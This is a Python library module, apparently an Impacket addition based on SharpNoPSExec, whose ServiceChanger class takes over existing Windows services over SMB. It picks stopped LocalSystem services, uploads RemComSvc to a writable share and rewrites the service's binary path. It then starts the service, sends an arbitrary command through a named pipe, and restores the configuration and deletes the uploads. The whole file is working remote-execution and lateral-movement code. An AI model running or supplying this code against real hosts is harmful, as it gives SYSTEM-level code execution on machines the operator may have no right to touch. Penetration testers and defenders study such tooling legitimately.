#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Service Change Helper library - Modify existing Windows services
#   Based on SharpNoPSExec logic for service hijacking and restoration
#
# Author:
#   Based on SharpNoPSExec by Julio Ureña (PlainText)
#   Adapted for Impacket by Assistant
#

import random
import string
import time
import os
from impacket.dcerpc.v5 import transport, srvs, scmr
from impacket import smb, smb3, LOG
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import FILE_WRITE_DATA, FILE_DIRECTORY_FILE
from impacket.examples import remcomsvc

class ServiceInfo:
    """Service information structure"""
    def __init__(self):
        self.service_name = ""
        self.display_name = ""
        self.service_type = 0
        self.start_type = 0
        self.error_control = 0
        self.binary_path_name = ""
        self.load_order_group = ""
        self.tag_id = 0
        self.dependencies = ""
        self.start_name = ""
        self.service_handle = None
        self.current_status = 0
        self.is_suitable = False
        self.reason = ""
        self.priority = 999

class ServiceChanger:
    def __init__(self, SMBObject, target_host=""):
        """
        Initialize ServiceChanger
        
        Args:
            SMBObject: SMB connection object (SMBConnection, smb.SMB, or smb3.SMB3)
            target_host: Target hostname or IP address
        """
        self._rpctransport = 0
        self.target_host = target_host
        self.connection = None
        self.rpcsvc = None
        self.share = None
        self.uploaded_files = []
        
        # Convert SMB object to SMBConnection if needed
        if isinstance(SMBObject, smb.SMB) or isinstance(SMBObject, smb3.SMB3):
            self.connection = SMBConnection(existingConnection=SMBObject)
        else:
            self.connection = SMBObject

    def openSvcManager(self):
        """Open Service Control Manager"""
        LOG.info("Opening SVCManager on %s....." % self.connection.getRemoteHost())
        
        self._rpctransport = transport.SMBTransport(
            self.connection.getRemoteHost(), 
            self.connection.getRemoteHost(),
            filename=r'\svcctl', 
            smb_connection=self.connection
        )
        
        self.rpcsvc = self._rpctransport.get_dce_rpc()
        self.rpcsvc.connect()
        self.rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
        
        try:
            resp = scmr.hROpenSCManagerW(self.rpcsvc)
        except:
            LOG.critical("Error opening SVCManager on %s....." % self.connection.getRemoteHost())
            raise Exception('Unable to open SVCManager')
        else:
            return resp['lpScHandle']

    def getServiceInfo(self, service_name, scm_handle):
        """Get detailed information about a specific service"""
        LOG.info("Querying service %s" % service_name)
        service_info = ServiceInfo()
        service_info.service_name = service_name
        
        try:
            resp = scmr.hROpenServiceW(self.rpcsvc, scm_handle, service_name + '\x00')
            service_handle = resp['lpServiceHandle']
            
            config_resp = scmr.hRQueryServiceConfigW(self.rpcsvc, service_handle)
            config = config_resp['lpServiceConfig']
            
            status_resp = scmr.hRQueryServiceStatus(self.rpcsvc, service_handle)
            status = status_resp['lpServiceStatus']
            service_info.service_type = config['dwServiceType']
            service_info.start_type = config['dwStartType']
            service_info.error_control = config['dwErrorControl']
            service_info.binary_path_name = config['lpBinaryPathName']
            service_info.load_order_group = config['lpLoadOrderGroup']
            service_info.tag_id = config['dwTagId']
            service_info.dependencies = config['lpDependencies']
            service_info.start_name = config['lpServiceStartName']
            service_info.display_name = config['lpDisplayName']
            service_info.service_handle = service_handle
            service_info.current_status = status['dwCurrentState']
            scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
            
        except Exception as e:
            LOG.error("Error getting service info for %s: %s" % (service_name, str(e)))
            service_info.reason = "Error querying service: %s" % str(e)
        
        return service_info

    def isServiceSuitable(self, service_info):
        """
        Check if a service is suitable for hijacking based on priority system
        Based on successful hijacking patterns: ALG, SNMPTRAP, RpcLocator
        
        Priority factors (lower number = higher priority):
        1. Service status (stopped = higher priority)
        2. Binary path type (direct exe = higher priority)
        3. Service type (WIN32_OWN_PROCESS = highest priority)
        4. Account type (system accounts = higher priority)
        5. Start type (disabled/manual = higher priority)
        6. Dependencies (no deps = higher priority)
        """
        # Service suitability analysis for hijacking
        try:
            priority = 0
            
            if service_info.current_status != scmr.SERVICE_STOPPED:
                service_info.reason = "Service is not stopped (current status: %d, expected: %d)" % (service_info.current_status, scmr.SERVICE_STOPPED)
                return False
            
            if not service_info.binary_path_name or not service_info.binary_path_name.strip():
                service_info.reason = "Service has no binary path"
                return False
            binary_path = service_info.binary_path_name.strip().rstrip('\x00')
            if ' ' in binary_path:
                exe_name = binary_path.split(' ')[0]
            else:
                exe_name = binary_path
            
            exe_name = exe_name.split('\\')[-1].lower()
            if exe_name == 'svchost.exe':
                priority += 30
            elif exe_name in ['services.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe', 'wininit.exe']:
                priority += 25
            elif exe_name.endswith('.exe'):
                priority += 0
            elif exe_name.endswith(('.com', '.bat', '.cmd')):
                priority += 2
            else:
                priority += 10
            
            if service_info.service_type == scmr.SERVICE_WIN32_OWN_PROCESS:
                priority += 0
            elif service_info.service_type == scmr.SERVICE_WIN32_SHARE_PROCESS:
                priority += 2
            elif service_info.service_type == scmr.SERVICE_KERNEL_DRIVER:
                priority += 20
            elif service_info.service_type == scmr.SERVICE_FILE_SYSTEM_DRIVER:
                priority += 20
            else:
                priority += 5
            
            clean_start_name = service_info.start_name.rstrip('\x00').strip().lower() if service_info.start_name else ""
            if clean_start_name in ["localsystem", ""]:
                priority += 0
            elif clean_start_name in ["nt authority\\localservice", "nt authority\\networkservice"]:
                priority += 1
            elif "nt authority" in clean_start_name:
                priority += 3
            else:
                priority += 8
            
            if service_info.start_type == scmr.SERVICE_DISABLED:
                priority += 0
            elif service_info.start_type == scmr.SERVICE_DEMAND_START:
                priority += 1
            else:
                priority += 5
            
            if service_info.dependencies and service_info.dependencies.strip():
                priority += 2
                deps_info = "has dependencies"
            else:
                priority += 0
                deps_info = "no dependencies"
            
            if exe_name in ['alg.exe', 'snmptrap.exe', 'locator.exe']:
                priority -= 5
            
            if 'system32' in binary_path.lower():
                priority -= 1
            if priority > 15:
                service_info.reason = "Service priority too low (%d > 15): %s, %s, %s" % (priority, exe_name, clean_start_name or "LocalSystem", deps_info)
                return False
            service_type_map = {
                1: "KERNEL_DRIVER",
                2: "FILE_SYSTEM_DRIVER", 
                4: "ADAPTER",
                8: "RECOGNIZER_DRIVER",
                16: "WIN32_OWN_PROCESS",
                32: "WIN32_SHARE_PROCESS",
                256: "INTERACTIVE_PROCESS"
            }
            service_type_str = service_type_map.get(service_info.service_type, "UNKNOWN")
            
            service_info.priority = priority
            service_info.is_suitable = True
            service_info.reason = "Suitable for hijacking (priority: %d, %s, %s, %s, %s)" % (priority, service_type_str, exe_name, clean_start_name or "LocalSystem", deps_info)
            return True
            
        except Exception as e:
            service_info.reason = "Error checking service suitability: %s" % str(e)
            LOG.error("Error in isServiceSuitable for %s: %s" % (service_info.service_name, str(e)))
            return False

    def listAllServices(self):
        """List all services and mark suitable ones for hijacking"""
        LOG.info("Listing all services on %s....." % self.connection.getRemoteHost())
        
        try:
            scm_handle = self.openSvcManager()
            services = scmr.hREnumServicesStatusW(self.rpcsvc, scm_handle)
            
            service_list = []
            suitable_count = 0
            
            for service in services:
                service_info = self.getServiceInfo(service['lpServiceName'], scm_handle)
                if service_info.service_name:
                    is_suitable = self.isServiceSuitable(service_info)
                    if is_suitable:
                        service_list.append(service_info)
                        suitable_count += 1
            
            scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            LOG.info("Suitable for hijacking: %d" % suitable_count)
            return service_list
            
        except Exception as e:
            LOG.critical("Error listing services: %s" % str(e))
            raise

    def findSuitableService(self, preferred_service=None):
        """
        Find a suitable service for hijacking
        Priority: 1. Disabled + Stopped + LocalSystem
                 2. Manual + Stopped + LocalSystem
        """
        LOG.info("Looking for suitable service for hijacking...")
        
        try:
            scm_handle = self.openSvcManager()
            services = scmr.hREnumServicesStatusW(self.rpcsvc, scm_handle)
            
            suitable_services = []
            
            for service in services:
                service_info = self.getServiceInfo(service['lpServiceName'], scm_handle)
                if service_info.service_name and service_info.start_type == scmr.SERVICE_DISABLED:
                    if self.isServiceSuitable(service_info):
                        suitable_services.append(service_info)
                        LOG.info("Found suitable Disabled service: %s" % service_info.service_name)
            
            if not suitable_services:
                for service in services:
                    service_info = self.getServiceInfo(service['lpServiceName'], scm_handle)
                    if service_info.service_name and service_info.start_type == scmr.SERVICE_DEMAND_START:
                        if self.isServiceSuitable(service_info):
                            suitable_services.append(service_info)
                            LOG.info("Found suitable Manual service: %s" % service_info.service_name)
            
            scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            
            if suitable_services:
                selected = random.choice(suitable_services)
                LOG.info("Selected service for hijacking: %s" % selected.service_name)
                return selected
            else:
                LOG.warning("No suitable services found for hijacking")
                return None
                
        except Exception as e:
            LOG.critical("Error finding suitable service: %s" % str(e))
            raise

    def backupServiceConfig(self, service_name):
        """Backup original service configuration"""
        LOG.info("Backing up configuration for service %s" % service_name)
        
        try:
            scm_handle = self.openSvcManager()
            service_info = self.getServiceInfo(service_name, scm_handle)
            scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            
            if service_info.service_name:
                LOG.info("Service backup completed:")
                LOG.info("  - Binary Path: %s" % service_info.binary_path_name)
                LOG.info("  - Start Type: %d" % service_info.start_type)
                LOG.info("  - Start Name: %s" % service_info.start_name)
                return service_info
            else:
                raise Exception("Failed to get service information")
                
        except Exception as e:
            LOG.critical("Error backing up service config: %s" % str(e))
            raise

    def hijackService(self, service_name, payload):
        """Hijack service by modifying its configuration to execute payload"""
        # Main service hijacking method
        LOG.info("Hijacking service %s with payload: %s" % (service_name, payload))
        
        try:
            scm_handle = self.openSvcManager()
            
            resp = scmr.hROpenServiceW(self.rpcsvc, scm_handle, service_name + '\x00')
            service_handle = resp['lpServiceHandle']
            scmr.hRChangeServiceConfigW(
                self.rpcsvc, service_handle,
                scmr.SERVICE_NO_CHANGE,
                scmr.SERVICE_DEMAND_START,
                scmr.SERVICE_NO_CHANGE,
                payload + '\x00',
                scmr.NULL,
                scmr.NULL,
                scmr.NULL,
                0,
                scmr.NULL,
                scmr.NULL,
                0,
                scmr.NULL
            )
            
            LOG.info("Service configuration modified successfully")
            LOG.info("Starting service to execute payload...")
            scmr.hRStartServiceW(self.rpcsvc, service_handle)
            
            scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
            scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            
            return True
            
        except Exception as e:
            LOG.critical("Error hijacking service: %s" % str(e))
            return False

    def startService(self, service_name):
        """Start a service"""
        LOG.info("Starting service %s..." % service_name)
        
        try:
            scm_handle = self.openSvcManager()
            resp = scmr.hROpenServiceW(self.rpcsvc, scm_handle, service_name + '\x00')
            service_handle = resp['lpServiceHandle']
            
            scmr.hRStartServiceW(self.rpcsvc, service_handle)
            scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
            scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            
            LOG.info("Service %s started successfully" % service_name)
            return True
            
        except Exception as e:
            LOG.error("Error starting service %s: %s" % (service_name, str(e)))
            return False

    def stopService(self, service_name):
        """Stop a service if it's running"""
        try:
            scm_handle = self.openSvcManager()
            resp = scmr.hROpenServiceW(self.rpcsvc, scm_handle, service_name + '\x00')
            service_handle = resp['lpServiceHandle']
            
            try:
                scmr.hRControlService(self.rpcsvc, service_handle, scmr.SERVICE_CONTROL_STOP)
                LOG.info("Service %s stopped successfully" % service_name)
            except:
                LOG.debug("Service %s was not running or already stopped" % service_name)
            
            scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
            scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            return True
            
        except Exception as e:
            LOG.warning("Error stopping service %s: %s" % (service_name, str(e)))
            return False

    def restoreServiceConfig(self, service_name, original_config):
        """Restore original service configuration"""
        # Restore service to original state after hijacking
        LOG.info("Restoring original service configuration for %s..." % service_name)
        
        scm_handle = None
        service_handle = None
        
        try:
            LOG.info("Stopping service %s before restoration..." % service_name)
            self.stopService(service_name)
            
            import time
            time.sleep(2)
            
            scm_handle = self.openSvcManager()
            if scm_handle == 0:
                raise Exception("Failed to open SCM")
            
            resp = scmr.hROpenServiceW(self.rpcsvc, scm_handle, service_name + '\x00')
            service_handle = resp['lpServiceHandle']
            LOG.info("Restoring service configuration...")
            LOG.info("  - Binary Path: %s" % original_config.binary_path_name)
            LOG.info("  - Start Type: %d" % original_config.start_type)
            LOG.info("  - Start Name: %s" % original_config.start_name)
            
            scmr.hRChangeServiceConfigW(
                self.rpcsvc, service_handle,
                scmr.SERVICE_NO_CHANGE,
                original_config.start_type,
                scmr.SERVICE_NO_CHANGE,
                original_config.binary_path_name + '\x00' if original_config.binary_path_name else scmr.NULL,
                scmr.NULL,
                scmr.NULL,
                scmr.NULL,
                0,
                original_config.start_name + '\x00' if original_config.start_name else scmr.NULL,
                scmr.NULL,
                0,
                scmr.NULL
            )
            
            LOG.info("Service configuration restored successfully")
            return True
            
        except Exception as e:
            LOG.critical("Error restoring service config: %s" % str(e))
            return False
        finally:
            try:
                if service_handle:
                    scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
                if scm_handle:
                    scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
            except:
                pass

    def getShares(self):
        """Get available shares on target"""
        LOG.info("Requesting shares on %s....." % (self.connection.getRemoteHost()))
        try:
            self._rpctransport = transport.SMBTransport(self.connection.getRemoteHost(),
                                                        self.connection.getRemoteHost(),
                                                        filename=r'\srvsvc',
                                                        smb_connection=self.connection)
            dce_srvs = self._rpctransport.get_dce_rpc()
            dce_srvs.connect()
            dce_srvs.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrShareEnum(dce_srvs, 1)
            return resp['InfoStruct']['ShareInfo']['Level1']
        except:
            LOG.critical("Error requesting shares on %s, aborting....." % (self.connection.getRemoteHost()))
            raise

    def findWritableShare(self, shares):
        """Find a writable share for file uploads"""
        writeableShare = None
        for i in shares['Buffer']:
            if i['shi1_type'] == srvs.STYPE_DISKTREE or i['shi1_type'] == srvs.STYPE_SPECIAL:
                share = i['shi1_netname'][:-1]
                tid = 0
                try:
                    tid = self.connection.connectTree(share)
                    self.connection.openFile(tid, '\\', FILE_WRITE_DATA, creationOption=FILE_DIRECTORY_FILE)
                except:
                    LOG.debug('Exception', exc_info=True)
                    LOG.critical("share '%s' is not writable." % share)
                    pass
                else:
                    LOG.info('Found writable share %s' % share)
                    writeableShare = str(share)
                    break
                finally:
                    if tid != 0:
                        self.connection.disconnectTree(tid)
        return writeableShare

    def uploadFile(self, local_file, remote_filename=None):
        """Upload a file to the target"""
        if self.share is None:
            shares = self.getShares()
            self.share = self.findWritableShare(shares)
            if self.share is None:
                raise Exception("No writable share found")
        
        if remote_filename is None:
            remote_filename = os.path.basename(local_file)
        
        LOG.info("Uploading file %s to %s" % (local_file, remote_filename))
        
        try:
            if isinstance(local_file, str):
                fh = open(local_file, 'rb')
            else:
                fh = local_file
            
            pathname = remote_filename.replace('/', '\\')
            self.connection.putFile(self.share, pathname, fh.read)
            fh.close()
            
            self.uploaded_files.append(remote_filename)
            LOG.info("File uploaded successfully")
            return True
            
        except Exception as e:
            LOG.critical("Error uploading file %s: %s" % (local_file, str(e)))
            raise

    def cleanupFiles(self):
        """Clean up uploaded files"""
        if not self.uploaded_files:
            return
        
        LOG.info("Cleaning up uploaded files...")
        for filename in self.uploaded_files:
            try:
                self.connection.deleteFile(self.share, filename)
                LOG.info("Deleted file: %s" % filename)
            except Exception as e:
                LOG.warning("Failed to delete file %s: %s" % (filename, str(e)))
        
        self.uploaded_files = []

    def executePayloadViaService(self, service_name, payload, wait_time=5):
        """
        Complete payload execution via service hijacking
        This method replicates the exact logic of original psexec.py doStuff method
        but uses service hijacking instead of service installation
        """
        # Complete service hijacking execution workflow
        LOG.info("Executing payload via service hijacking: %s" % service_name)
        
        original_config = None
        service_hijacked = False
        
        try:
            original_config = self.backupServiceConfig(service_name)
            
            LOG.info("Uploading RemComSvc...")
            from impacket.examples import serviceinstall
            
            installService = serviceinstall.ServiceInstall(self.connection, remcomsvc.RemComSvc(), service_name, None)
            
            remcom_svc = remcomsvc.RemComSvc()
            remcom_filename = installService.binaryServiceName
            remcom_path = installService.getShare() + "\\" + remcom_filename
            
            self.uploadFile(remcom_svc, "System32\\" + remcom_filename)
            
            full_remcom_path = "C:\\Windows\\System32\\" + remcom_filename
            if not self.hijackService(service_name, full_remcom_path):
                raise Exception("Failed to hijack service")
            service_hijacked = True
            
            LOG.info("Stopping service first...")
            self.stopService(service_name)
            
            LOG.info("Starting service...")
            if not self.startService(service_name):
                raise Exception("Failed to start service")
            
            LOG.info("Executing command via RemComSvc...")
            
            s = self.connection
            s.setTimeout(100000)
            
            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s, tid, r'\RemCom_communicaton', 0x12019f)
            from impacket.structure import Structure
            
            class RemComMessage(Structure):
                structure = (
                    ('Command','4096s=""'),
                    ('WorkingDir','260s=""'),
                    ('Priority','<L=0x20'),
                    ('ProcessID','<L=0x01'),
                    ('Machine','260s=""'),
                    ('NoWait','<L=0'),
                )
            
            class RemComResponse(Structure):
                structure = (
                    ('ErrorCode','<L=0'),
                    ('ReturnCode','<L=0'),
                )
            
            packet = RemComMessage()
            pid = os.getpid()
            
            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
            packet['Command'] = payload
            packet['ProcessID'] = pid
            
            s.writeNamedPipe(tid, fid_main, packet.getData())
            
            ans = s.readNamedPipe(tid, fid_main, 8)
            
            if len(ans):
                retCode = RemComResponse(ans)
                LOG.info("Command executed - ErrorCode: %d, ReturnCode: %d" % (
                    retCode['ErrorCode'], retCode['ReturnCode']))
            
            LOG.info("Stopping service...")
            self.stopService(service_name)
            
            if not self.restoreServiceConfig(service_name, original_config):
                LOG.warning("Failed to restore service configuration - manual cleanup may be required")
                return False
            
            LOG.info("Uninstalling service...")
            installService.uninstall()
            
            LOG.info("Payload execution completed successfully")
            return True
            
        except Exception as e:
            LOG.critical("Error executing payload via service: %s" % str(e))
            return False
        finally:
            if service_hijacked and original_config:
                try:
                    LOG.info("Attempting to restore service configuration...")
                    self.restoreServiceConfig(service_name, original_config)
                except Exception as e:
                    LOG.critical("Failed to restore service configuration: %s" % str(e))
                    LOG.critical("Manual cleanup required for service: %s" % service_name)
            
            self.cleanupFiles()
    
    def openPipe(self, s, tid, pipe, accessMask):
        """Open named pipe (same as original psexec)"""
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                s.waitNamedPipe(tid, pipe)
                pipeReady = True
            except:
                tries -= 1
                time.sleep(2)
                pass
        
        if tries == 0:
            raise Exception('Pipe not ready, aborting')
        
        fid = s.openFile(tid, pipe, accessMask, creationOption=0x40, fileAttributes=0x80)
        return fid

# Example usage and testing
if __name__ == '__main__':
    print("ServiceChanger - Windows Service Hijacking Tool")
    print("This is a helper library for hijacking Windows services")
    print("Use this class in your own scripts to modify remote services")
